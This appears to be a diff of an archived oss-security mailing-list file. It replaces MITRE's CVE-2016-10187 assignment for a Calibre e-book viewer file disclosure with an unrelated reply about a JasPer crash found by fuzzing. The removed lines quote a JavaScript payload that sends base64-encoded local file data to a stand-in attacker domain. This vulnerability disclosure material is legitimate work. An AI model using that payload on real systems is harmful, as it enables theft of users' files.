@@ -1,49 +1,44 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/31/9
-Message-ID: <0cab773cce2c4a279f0667a388d3728c@imshyb01.MITRE.ORG>
-Date: Tue, 31 Jan 2017 10:19:04 -0500
-From: <cve-assign@...re.org>
-To: <mpitt@...ian.org>
-CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>, <anarcat@...ian.org>
-Subject: Re: Requesting CVE for calibre file disclosure
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/06/2
+Message-ID: <57f09f12-2cf9-a77b-86d9-1f981fc10930@gmail.com>
+Date: Mon, 6 Mar 2017 09:06:00 +0100
+From: Emilio Pozuelo Monfort <pochu27@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-Request JasPer 2.0.12 NULL Pointer Dereference jp2_encode (jp2_enc.c)
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
-
-> Calibre 2.75 fixed what looks like a local data disclosure vulnerability:
+On 06/03/17 03:16, Anthony Sasadeusz wrote:
+> admin@...172-31-13-10:~/jasper/build-asan/src/appl$ ./jasper --input
+> ../../../build-afl/src/appl/findings/crashes/id\:000000\,sig\:11\,src\:000002\,op\:havoc\,rep\:16
+> --output /dev/null --output-format jp2
+> ASAN:SIGSEGV
+> =================================================================
+> ==16088==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
+> (pc 0x7f45f3104fe6 sp 0x7ffcd24052c0 bp 0x7ffcd24063d0 T0)
+>     #0 0x7f45f3104fe5 in jp2_encode
+> /home/admin/jasper/src/libjasper/jp2/jp2_enc.c:119
+>     #1 0x7f45f30de187 in jas_image_encode
+> /home/admin/jasper/src/libjasper/base/jas_image.c:471
+>     #2 0x402494 in main /home/admin/jasper/src/appl/jasper.c:277
+>     #3 0x7f45f2a1eb44 in __libc_start_main
+> (/lib/x86_64-linux-gnu/libc.so.6+0x21b44)
+>     #4 0x401908 (/home/admin/jasper/build-asan/src/appl/jasper+0x401908)
 > 
-> https://github.com/kovidgoyal/calibre/commit/3a89718664cb8cce0449d1758eee585ed0d0433c
+> AddressSanitizer can not provide additional info.
+> SUMMARY: AddressSanitizer: SEGV
+> /home/admin/jasper/src/libjasper/jp2/jp2_enc.c:119 jp2_encode
+> ==16088==ABORTING
 > 
-> E-book viewer: Prevent javascript in the book from accessing files on the computer using XMLHttpRequest.
+> 
+> This also happens on the latest master branch.
+> The repo: https://github.com/mdadams/jasper
+> 
+> Crashing inputs found with afl:
+> https://github.com/nullsector/jasper-fuzz/tree/master/testcases/crashes
 
-> https://bugs.launchpad.net/calibre/+bug/1651728
+You should request CVEs at http://cveform.mitre.org/ these days.
 
->> When attacker change document.write in payload to this:
->> document.write('<img src="http://evildomain.pl/some.jpg?data=' + btoa(data) + '">');
->> could easily read data from server log.
+Also it'd be good if you opened an upstream bug report about this.
 
-Use CVE-2016-10187.
-
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJYkKkAAAoJEHb/MwWLVhi2VMIQAJR5qTlhg0haVZfpsRXpX8YG
-O3JHHe2AW1NfvM8nYnxLK6MKfgBGIIh2oehQr9fG0wvKp0UF5Nmw8suFdiivfUFC
-N5KorT7Yb8xVJJzZmksPQ0mna8KAjJj5tw+1tentldFR0qbBnMxT0FiswF0rh815
-B5eVflvSH1gu3f9uEHpk3HSHZ0RagMwwA8XGe6h2AigShdQr6VCjP8SMafiu9pSA
-mXB+uFRso6bs5moyspW66DsuixeBBgFXn8QjoNhBWLA0Hj+d4Sz6BC0uUXCtPjy6
-6eWLZW2LOjiAlymGNgYuXXxDWslEBYe2LCnLntHKPff/JphuwwqdUz5dHHObktII
-uOXYrT7/Fyw6GLUtU3OulmqPbi4hOxEC2ERTse4l1RH9L6GpbBKY7Usq6xM9f9gx
-zYD+nQOVfR1aI/otMqsw0PaQSXyENId0Yv31+vwZTXk/TZ1dFBByaRCkjEAeTACR
-uh++QTFQKe2z91g+57jAQvAeD9hx6pepr3gV1b0QYjXgsDW2as+FDtWrYUVlVqdf
-NszEb+Z5sdVwEBFQVWqDudvZvUPnoaGgb7YrQxY85YSjoqrYk50iWArup2OMSxAb
-tMiMJjWuUiU17BPL/ih3OAdEJceUuyVjkmT/rTcjLbGHrCRPT+OZHyqDohzaQKbx
-k5XtJrNvWNusE+Q69k0e
-=tz/j
------END PGP SIGNATURE-----
+Cheers,
+Emilio
